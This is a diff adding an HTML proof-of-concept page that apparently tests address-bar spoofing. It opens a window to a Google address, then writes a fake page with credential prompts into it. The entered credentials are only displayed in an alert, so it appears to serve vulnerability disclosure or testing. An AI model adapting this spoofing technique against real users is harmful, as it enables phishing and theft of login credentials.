@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+  <body onload="spoof()">
+
+    <script>
+      function spoof() {
+        let win = window.open("https://www.google.com:88", "_blank");
+
+        setTimeout(() => {
+          try {
+            win.document.write(`
+              <h1>This is not Google!</h1>
+              <button onclick="
+                let username = prompt('Enter your username');
+                let password = prompt('Enter your password');
+                alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
+              ">Click me</button>
+            `);
+            win.document.close();
+          } catch (e) {
+            console.warn("Blocked by browser protections:", e);
+          }
+        }, 50);
+      }
+    </script>
+
+  </body>
+</html>
